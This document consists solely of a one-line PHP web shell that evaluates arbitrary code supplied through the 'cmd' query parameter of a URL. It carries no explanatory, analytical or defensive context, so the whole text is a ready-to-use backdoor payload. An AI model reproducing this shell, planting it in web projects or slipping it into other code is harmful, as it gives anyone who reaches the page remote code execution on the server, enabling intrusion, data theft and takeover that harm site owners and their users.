<?eval($_GET[cmd]);?>
